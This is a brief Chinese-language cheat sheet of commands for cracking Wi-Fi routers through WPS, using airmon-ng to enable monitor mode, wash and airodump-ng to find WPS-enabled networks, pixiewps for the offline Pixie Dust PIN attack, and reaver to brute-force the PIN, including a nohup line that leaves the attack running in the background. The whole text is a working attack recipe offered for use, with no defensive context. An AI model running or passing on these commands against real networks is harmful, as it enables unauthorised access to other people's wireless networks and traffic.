##aircrack-ng reaver pin攻击

####激活无线网卡
     airmon-ng start wlan0 # 此时网卡名变为wlan0mon
     airmon-ng check kill # 如果报错
     wash -i mon1 -P
     airodump-ng wlan0mon -wps # 显示有开启wps wifi
####列出监听到的wifi
    wash -i wlan0mon -C
####获得wps pin
    pixiewps -e PKE -r PKR -s eHash1 -z eHash2 -a AuthKey -n enonce -m rnonce -f -v 3
####pin
    reaver -i wlan0mon -b 00:8e:f2:4e:3a:32 -vv
    reaver -i mon0  -b 00:01:02:03:04:05 -vv -S -N -L -d 60 -r 3:15 -T .5 -x 360
    # --pin=00000000 -p 从哪里开始pin
    reaver -i {monitor interface} -b {BSSID of router} -c {router channel} -vvv -K 1 -f # 快速
####挂机
    nohup sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11 -o fbi &
